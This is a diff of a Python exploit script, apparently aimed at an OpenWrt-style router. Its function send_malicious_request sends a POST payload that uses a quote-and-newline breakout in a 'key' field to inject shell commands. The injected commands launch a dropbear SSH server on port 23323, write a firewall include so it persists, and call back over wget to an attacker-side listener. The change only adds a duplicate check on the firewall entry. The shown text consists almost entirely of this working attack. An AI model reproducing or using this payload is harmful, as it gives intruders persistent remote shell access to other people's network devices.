@@ -102,7 +102,7 @@ def send_malicious_request():
     }
     
     # Payload
-    data = f"uid=1234&key=1234'%0Acp%20%2Ftmp%2Fdropbear%20%2Fdata%2Fdropbear%0Aecho%20'%2Fdata%2Fdropbear%20-r%20%2Fetc%2Fconfig%2Fdropbear%2Fdropbear_rsa_host_key%20-p%2023323'%20%3E%20%2Fdata%2Fstart_ssh.sh%0Achmod%20%2Bx%20%2Fdata%2Fstart_ssh.sh%0Aprintf%20%22%0A%0Aconfig%20include%20'dropbear'%0A%09option%20type%20'script'%0A%09option%20path%20'%2Fdata%2Fstart_ssh.sh'%0A%09option%20enabled%20'1'%22%20%3E%3E%20%2Fetc%2Fconfig%2Ffirewall%0Awget%20\"http://{LOCAL_IP}:{PORT}/c3VjY2Vzcw%3D%3D\"'"
+    data = f"uid=1234&key=1234'%0Acp%20%2Ftmp%2Fdropbear%20%2Fdata%2Fdropbear%0Aecho%20'%2Fdata%2Fdropbear%20-r%20%2Fetc%2Fconfig%2Fdropbear%2Fdropbear_rsa_host_key%20-p%2023323'%20%3E%20%2Fdata%2Fstart_ssh.sh%0Achmod%20%2Bx%20%2Fdata%2Fstart_ssh.sh%0Agrep%20-q%20%22config%20include%20'dropbear'%22%20%2Fetc%2Fconfig%2Ffirewall%20%7C%7C%20printf%20%22%0A%0Aconfig%20include%20'dropbear'%0A%09option%20type%20'script'%0A%09option%20path%20'%2Fdata%2Fstart_ssh.sh'%0A%09option%20enabled%20'1'%22%20%3E%3E%20%2Fetc%2Fconfig%2Ffirewall%0Awget%20\"http://{LOCAL_IP}:{PORT}/c3VjY2Vzcw%3D%3D\"'"
     
     try:
         # Send POST request
